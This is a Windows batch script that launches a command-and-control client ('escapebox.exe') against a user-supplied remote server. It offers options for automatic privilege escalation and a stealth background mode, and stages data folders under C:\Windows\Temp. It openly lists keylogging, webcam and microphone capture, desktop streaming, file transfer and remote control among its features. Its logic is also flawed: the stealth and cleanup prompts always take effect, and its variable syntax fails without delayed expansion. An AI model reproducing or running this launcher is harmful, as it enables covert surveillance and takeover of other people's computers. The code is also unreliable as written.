@echo off
echo ================================================================
echo            ENHANCED C2 CLIENT CONNECTOR
echo ================================================================
echo.

if "%1"=="" (
    echo Usage: %0 [server_ip] [port] [options]
    echo.
    echo Options:
    echo   --no-auto-elevate    Do not attempt automatic privilege escalation
    echo   --stealth           Run in stealth mode
    echo   --debug            Enable debug output
    echo.
    echo Examples:
    echo   %0 192.168.1.100
    echo   %0 192.168.1.100 8443
    echo   %0 192.168.1.100 443 --no-auto-elevate
    echo.
    echo Default server: localhost
    echo Default port: 443
    echo.
    set /p SERVER_IP="Enter server IP (default: localhost): "
    if "!SERVER_IP!"=="" set SERVER_IP=localhost
    
    set /p SERVER_PORT="Enter server port (default: 443): "
    if "!SERVER_PORT!"=="" set SERVER_PORT=443
    
    echo.
    choice /C YN /M "Attempt automatic privilege escalation"
    if errorlevel 2 (
        set ELEVATION_FLAG=--no-auto-elevate
    ) else (
        set ELEVATION_FLAG=
    )
    
    choice /C YN /M "Run in stealth mode"
    if errorlevel 1 (
        set STEALTH_FLAG=--stealth
    ) else (
        set STEALTH_FLAG=
    )
    
) else (
    set SERVER_IP=%1
    set SERVER_PORT=%2
    if "!SERVER_PORT!"=="" set SERVER_PORT=443
    set ELEVATION_FLAG=%3
    set STEALTH_FLAG=%4
)

echo.
echo ================================================================
echo            CLIENT CONNECTION DETAILS
echo ================================================================
echo Server IP: %SERVER_IP%
echo Server Port: %SERVER_PORT%
echo Elevation: %ELEVATION_FLAG%
echo Stealth Mode: %STEALTH_FLAG%
echo ================================================================
echo.

REM Check if C2 client exists
if not exist "escapebox.exe" (
    echo [ERROR] escapebox.exe not found in current directory
    echo Please make sure you are running this from the correct directory
    pause
    exit /b 1
)

REM Create client-specific directories
echo [*] Creating client directories...
mkdir "C:\Windows\Temp\C2_Client_Data" 2>nul
mkdir "C:\Windows\Temp\C2_Client_Uploads" 2>nul
mkdir "C:\Windows\Temp\C2_Client_Screenshots" 2>nul

REM Check network connectivity to server
echo [*] Testing connectivity to server...
ping -n 1 %SERVER_IP% >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Cannot ping server %SERVER_IP%
    echo This may be normal if ICMP is blocked
    choice /C YN /M "Continue with connection attempt"
    if errorlevel 2 exit /b 1
) else (
    echo [OK] Server %SERVER_IP% is reachable
)

REM Test port connectivity
echo [*] Testing port connectivity...
powershell -Command "$tcpClient = New-Object System.Net.Sockets.TcpClient; try { $tcpClient.Connect('%SERVER_IP%', %SERVER_PORT%); $tcpClient.Close(); exit 0 } catch { exit 1 }" >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Port %SERVER_PORT% on %SERVER_IP% is not accessible
    echo The server may not be running or port may be filtered
    choice /C YN /M "Continue with connection attempt"
    if errorlevel 2 exit /b 1
) else (
    echo [OK] Port %SERVER_PORT% is accessible
)

echo.
echo [*] Enhanced C2 Client Features:
echo   - Real-time desktop streaming
echo   - Bidirectional file transfer
echo   - Advanced keylogging
echo   - Webcam and microphone access
echo   - System monitoring and surveillance
echo   - Remote control capabilities
echo   - Stealth operation modes
echo.

if "%STEALTH_FLAG%"=="--stealth" (
    echo [*] Starting client in stealth mode...
    start /B "" escapebox.exe client %SERVER_IP% %SERVER_PORT% %ELEVATION_FLAG% %STEALTH_FLAG%
    echo [*] Client started in background
    echo [*] Check server dashboard for connection status
    timeout /t 5 /nobreak >nul
) else (
    echo [*] Starting enhanced C2 client...
    echo [*] Press Ctrl+C to disconnect
    echo.
    echo ================================================================
    echo               CLIENT STARTING
    echo ================================================================
    
    REM Start the client with enhanced capabilities
    escapebox.exe client %SERVER_IP% %SERVER_PORT% %ELEVATION_FLAG%
)

echo.
echo ================================================================
echo               CLIENT SESSION ENDED
echo ================================================================
echo.

REM Show connection statistics if available
if exist "C:\Windows\Temp\C2_Client_Data\stats.txt" (
    echo Connection Statistics:
    type "C:\Windows\Temp\C2_Client_Data\stats.txt"
    echo.
)

REM Clean up temporary files (optional)
choice /C YN /M "Clean up temporary client files"
if errorlevel 1 (
    echo [*] Cleaning up...
    rmdir /S /Q "C:\Windows\Temp\C2_Client_Data" 2>nul
    rmdir /S /Q "C:\Windows\Temp\C2_Client_Uploads" 2>nul
    echo [*] Cleanup completed
)

echo.
echo Thank you for using Enhanced C2 Client
pause